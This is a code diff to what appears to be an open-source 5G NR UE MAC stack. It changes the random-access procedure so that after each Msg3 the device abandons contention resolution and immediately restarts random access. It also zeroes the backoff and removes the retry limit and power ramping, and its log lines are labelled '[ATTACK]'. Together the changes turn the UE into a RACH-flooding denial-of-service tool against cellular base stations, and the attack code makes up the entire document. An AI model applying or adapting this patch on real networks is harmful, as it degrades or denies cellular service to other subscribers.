@@ -570,6 +570,7 @@ void nr_get_prach_resources(NR_UE_MAC_INST_t *mac,
 // TbD: RA_attempt_number not used
 void nr_Msg1_transmitted(NR_UE_MAC_INST_t *mac)
 {
+  LOG_E(NR_MAC, "Msg1 transmitted\n");
   RA_config_t *ra = &mac->ra;
   ra->ra_state = nrRA_WAIT_RAR;
   ra->RA_attempt_number++;
@@ -578,17 +579,30 @@ void nr_Msg1_transmitted(NR_UE_MAC_INST_t *mac)
 void nr_Msg3_transmitted(NR_UE_MAC_INST_t *mac, uint8_t CC_id, frame_t frameP, slot_t slotP, uint8_t gNB_id)
 {
   RA_config_t *ra = &mac->ra;
-  NR_RACH_ConfigCommon_t *nr_rach_ConfigCommon = mac->current_UL_BWP->rach_ConfigCommon;
-  long mu = mac->current_UL_BWP->scs;
-  int subframes_per_slot = nr_slots_per_frame[mu] / 10;
+  NR_PRACH_RESOURCES_t *prach_resources = &ra->prach_resources;
 
-  // start contention resolution timer
-  int RA_contention_resolution_timer_subframes = (nr_rach_ConfigCommon->ra_ContentionResolutionTimer + 1) << 3;
-  // timer step 1 slot and timer target given by ra_ContentionResolutionTimer
-  nr_timer_setup(&ra->contention_resolution_timer, RA_contention_resolution_timer_subframes * subframes_per_slot, 1);
-  nr_timer_start(&ra->contention_resolution_timer);
+  // NR_RACH_ConfigCommon_t *nr_rach_ConfigCommon = mac->current_UL_BWP->rach_ConfigCommon;
+  // long mu = mac->current_UL_BWP->scs;
+  // int subframes_per_slot = nr_slots_per_frame[mu] / 10;
 
-  ra->ra_state = nrRA_WAIT_CONTENTION_RESOLUTION;
+  // // start contention resolution timer
+  // int RA_contention_resolution_timer_subframes = (nr_rach_ConfigCommon->ra_ContentionResolutionTimer + 1) << 3;
+  // // timer step 1 slot and timer target given by ra_ContentionResolutionTimer
+  // nr_timer_setup(&ra->contention_resolution_timer, RA_contention_resolution_timer_subframes * subframes_per_slot, 1);
+  // nr_timer_start(&ra->contention_resolution_timer);
+
+  // ra->ra_state = nrRA_WAIT_CONTENTION_RESOLUTION;
+
+  // ra->ra_state = nrRA_GENERATE_PREAMBLE;
+  // ra->first_Msg3 = true;  // Reset to generate new preamble
+  LOG_E(NR_MAC, "[UE %d][%d.%d][ATTACK] Msg3 transmitted, resetting RA state to trigger new RA\n",
+        mac->ue_id, frameP, slotP);
+  static int msg3_transmissions = 0; // Track Msg3 transmissions for logging
+  LOG_I(NR_MAC, "[UE %d][%d.%d][ATTACK] Msg3 transmitted (%d), resetting RA state to trigger new RA\n",
+          mac->ue_id, frameP, slotP, ++msg3_transmissions);
+  ra->RA_RAPID_found = 0;
+
+  nr_ra_failed(mac, CC_id, prach_resources, frameP, slotP);
 }
 
 static uint8_t *fill_msg3_crnti_pdu(RA_config_t *ra, uint8_t *pdu, uint16_t crnti)
@@ -742,7 +756,7 @@ void nr_ue_get_rach(NR_UE_MAC_INST_t *mac, int CC_id, frame_t frame, uint8_t gNB
       }
 
       if (ra->RA_window_cnt >= 0 && ra->RA_RAPID_found == 1) {
-
+        LOG_D(MAC, "[UE %d][%d.%d] RAR received, RA window count %d\n", mac->ue_id, frame, nr_slot_tx, ra->RA_window_cnt);
         if(ra->cfra) {
           // Reset RA_active flag: it disables Msg3 retransmission (8.3 of TS 38.213)
           nr_ra_succeeded(mac, gNB_id, frame, nr_slot_tx);
@@ -776,9 +790,9 @@ void nr_ue_get_rach(NR_UE_MAC_INST_t *mac, int CC_id, frame_t frame, uint8_t gNB
     }
   }
 
-  if (is_nr_timer_active(ra->contention_resolution_timer)) {
-    nr_ue_contention_resolution(mac, CC_id, frame, nr_slot_tx, prach_resources);
-  }
+  // if (is_nr_timer_active(ra->contention_resolution_timer)) {
+  //   nr_ue_contention_resolution(mac, CC_id, frame, nr_slot_tx, prach_resources);
+  // }
 }
 
 void nr_get_RA_window(NR_UE_MAC_INST_t *mac)
@@ -890,26 +904,27 @@ void nr_ra_failed(NR_UE_MAC_INST_t *mac, uint8_t CC_id, NR_PRACH_RESOURCES_t *pr
   ra->first_Msg3 = true;
   ra->ra_PreambleIndex = -1;
   ra->ra_state = nrRA_UE_IDLE;
+  prach_resources->RA_PREAMBLE_BACKOFF = 0;
+  // prach_resources->RA_PREAMBLE_TRANSMISSION_COUNTER++;
 
-  prach_resources->RA_PREAMBLE_TRANSMISSION_COUNTER++;
+  // if (prach_resources->RA_PREAMBLE_TRANSMISSION_COUNTER == ra->preambleTransMax + 1){
 
-  if (prach_resources->RA_PREAMBLE_TRANSMISSION_COUNTER == ra->preambleTransMax + 1){
+  //   LOG_D(MAC, "[UE %d][%d.%d] Maximum number of RACH attempts (%d) reached, selecting backoff time...\n",
+  //         mac->ue_id,
+  //         frame,
+  //         slot,
+  //         ra->preambleTransMax);
 
-    LOG_D(MAC, "[UE %d][%d.%d] Maximum number of RACH attempts (%d) reached, selecting backoff time...\n",
-          mac->ue_id,
-          frame,
-          slot,
-          ra->preambleTransMax);
+  //   ra->RA_backoff_cnt = rand_r(&seed) % (prach_resources->RA_PREAMBLE_BACKOFF + 1);
+  //   prach_resources->RA_PREAMBLE_TRANSMISSION_COUNTER = 1;
+  //   prach_resources->RA_PREAMBLE_POWER_RAMPING_STEP += 2; // 2 dB increment
+  //   prach_resources->ra_PREAMBLE_RECEIVED_TARGET_POWER = nr_get_Po_NOMINAL_PUSCH(mac, prach_resources, CC_id);
 
-    ra->RA_backoff_cnt = rand_r(&seed) % (prach_resources->RA_PREAMBLE_BACKOFF + 1);
-    prach_resources->RA_PREAMBLE_TRANSMISSION_COUNTER = 1;
-    prach_resources->RA_PREAMBLE_POWER_RAMPING_STEP += 2; // 2 dB increment
-    prach_resources->ra_PREAMBLE_RECEIVED_TARGET_POWER = nr_get_Po_NOMINAL_PUSCH(mac, prach_resources, CC_id);
-
-  } else {
-    // Resetting RA window
-    nr_get_RA_window(mac);
-  }
+  // } else {
+  //   // Resetting RA window
+  //   nr_get_RA_window(mac);
+  // }
+  nr_get_RA_window(mac);
 }
 
 void schedule_RA_after_SR_failure(NR_UE_MAC_INST_t *mac)
